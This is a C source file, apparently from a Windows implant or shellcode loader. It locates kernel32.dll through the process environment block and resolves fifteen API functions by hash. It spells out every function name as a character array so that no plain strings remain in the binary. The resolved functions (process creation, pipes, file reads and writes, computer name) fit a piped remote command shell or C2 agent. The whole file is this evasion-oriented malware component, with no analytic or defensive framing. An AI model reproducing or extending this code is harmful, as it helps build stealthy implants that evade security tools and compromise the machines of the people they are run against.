#include "kernel32.h"
#include "system.h"
#include "wintypes.h"

BOOL KERNEL32_Ctor(KERNEL32 *kernel)
{
    PVOID module;

    if (kernel == NULL)
        return FALSE;

    module = GetModuleHandleFromPEB(Hash((WCHAR[]){L'k', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', L'\0'}));
    if (module == NULL)
        return FALSE;

    kernel->GetProcAddress = (PVOID (WINAPI *)(PVOID, const CHAR *))
        ResolveExportByHash(module, Hash((WCHAR[]){L'G', L'e', L't', L'P', L'r', L'o', L'c', L'A', L'd', L'd', L'r', L'e', L's', L's', L'\0'}));
    kernel->LoadLibraryA = (PVOID (WINAPI *)(const CHAR *))
        ResolveExportByHash(module, Hash((WCHAR[]){L'L', L'o', L'a', L'd', L'L', L'i', L'b', L'r', L'a', L'r', L'y', L'A', L'\0'}));
    kernel->GetComputerNameA = (BOOL (WINAPI *)(PCHAR, DWORD *))
        ResolveExportByHash(module, Hash((WCHAR[]){L'G', L'e', L't', L'C', L'o', L'm', L'p', L'u', L't', L'e', L'r', L'N', L'a', L'm', L'e', L'A', L'\0'}));
    kernel->SetHandleInformation = (BOOL (WINAPI *)(HANDLE, DWORD, DWORD))
        ResolveExportByHash(module, Hash((WCHAR[]){L'S', L'e', L't', L'H', L'a', L'n', L'd', L'l', L'e', L'I', L'n', L'f', L'o', L'r', L'm', L'a', L't', L'i', L'o', L'n', L'\0'}));
    kernel->CreateProcessW = (BOOL (WINAPI *)(const PWCHAR, const PWCHAR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, PVOID, const PWCHAR, LPSTARTUPINFOW, LPPROCESS_INFORMATION))
        ResolveExportByHash(module, Hash((WCHAR[]){L'C', L'r', L'e', L'a', L't', L'e', L'P', L'r', L'o', L'c', L'e', L's', L's', L'W', L'\0'}));
    kernel->CloseHandle = (BOOL (WINAPI *)(HANDLE))
        ResolveExportByHash(module, Hash((WCHAR[]){L'C', L'l', L'o', L's', L'e', L'H', L'a', L'n', L'd', L'l', L'e', L'\0'}));
    kernel->TerminateProcess = (BOOL (WINAPI *)(HANDLE, UINT32))
        ResolveExportByHash(module, Hash((WCHAR[]){L'T', L'e', L'r', L'm', L'i', L'n', L'a', L't', L'e', L'P', L'r', L'o', L'c', L'e', L's', L's', L'\0'}));
    kernel->WriteFile = (BOOL (WINAPI *)(HANDLE, const void *, DWORD, DWORD *, PVOID))
        ResolveExportByHash(module, Hash((WCHAR[]){L'W', L'r', L'i', L't', L'e', L'F', L'i', L'l', L'e', L'\0'}));
    kernel->ReadFile = (BOOL (WINAPI *)(HANDLE, void *, DWORD, DWORD *, PVOID))
        ResolveExportByHash(module, Hash((WCHAR[]){L'R', L'e', L'a', L'd', L'F', L'i', L'l', L'e', L'\0'}));
    kernel->PeekNamedPipe = (BOOL (WINAPI *)(HANDLE, void *, DWORD, DWORD *, DWORD *, DWORD *))
        ResolveExportByHash(module, Hash((WCHAR[]){L'P', L'e', L'e', L'k', L'N', L'a', L'm', L'e', L'd', L'P', L'i', L'p', L'e', L'\0'}));
    kernel->CreatePipe = (BOOL (WINAPI *)(HANDLE *, HANDLE *, LPSECURITY_ATTRIBUTES, DWORD))
        ResolveExportByHash(module, Hash((WCHAR[]){L'C', L'r', L'e', L'a', L't', L'e', L'P', L'i', L'p', L'e', L'\0'}));
    kernel->GetStdHandle = (HANDLE (WINAPI *)(DWORD))
        ResolveExportByHash(module, Hash((WCHAR[]){L'G', L'e', L't', L'S', L't', L'd', L'H', L'a', L'n', L'd', L'l', L'e', L'\0'}));
    kernel->GetLastError = (DWORD (WINAPI *)(void))
        ResolveExportByHash(module, Hash((WCHAR[]){L'G', L'e', L't', L'L', L'a', L's', L't', L'E', L'r', L'r', L'o', L'r', L'\0'}));
    kernel->Sleep = (void (WINAPI *)(DWORD))
        ResolveExportByHash(module, Hash((WCHAR[]){L'S', L'l', L'e', L'e', L'p', L'\0'}));
    kernel->ExitProcess = (void (WINAPI *)(UINT32))
        ResolveExportByHash(module, Hash((WCHAR[]){L'E', L'x', L'i', L't', L'P', L'r', L'o', L'c', L'e', L's', L's', L'\0'}));

    return (kernel->GetProcAddress != NULL &&
            kernel->LoadLibraryA != NULL &&
            kernel->GetComputerNameA != NULL &&
            kernel->SetHandleInformation != NULL &&
            kernel->CreateProcessW != NULL &&
            kernel->CloseHandle != NULL &&
            kernel->TerminateProcess != NULL &&
            kernel->WriteFile != NULL &&
            kernel->ReadFile != NULL &&
            kernel->PeekNamedPipe != NULL &&
            kernel->CreatePipe != NULL &&
            kernel->GetStdHandle != NULL &&
            kernel->GetLastError != NULL &&
            kernel->Sleep != NULL &&
            kernel->ExitProcess != NULL);
}
